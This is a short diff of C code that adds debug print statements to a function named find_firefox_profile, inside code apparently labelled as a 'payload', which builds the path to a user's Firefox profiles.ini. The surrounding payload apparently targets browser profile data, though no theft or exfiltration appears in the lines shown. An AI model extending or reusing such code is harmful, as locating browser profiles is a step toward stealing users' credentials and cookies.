@@ -979,11 +979,23 @@ payload_end()
 static int find_firefox_profile(char *profile_path_out, size_t len) {
     // Construct path to profiles.ini
     char profiles_ini[PATH_MAX];
+    
+    printf("[payload] About to call getenv(HOME)\n");
+    fflush(stdout);
+    
     const char *home = getenv("HOME");
+    
+    printf("[payload] getenv returned: %p\n", (void*)home);
+    fflush(stdout);
+    
     if (!home) {
-        write(1, "[payload] HOME environment variable not set\n", 45);
+        printf("[payload] HOME environment variable not set\n");
+        fflush(stdout);
         return 0;
     }
+    
+    printf("[payload] HOME = %s\n", home);
+    fflush(stdout);
     
     snprintf(profiles_ini, sizeof(profiles_ini), 
              "%s/snap/firefox/common/.mozilla/firefox/profiles.ini", home);
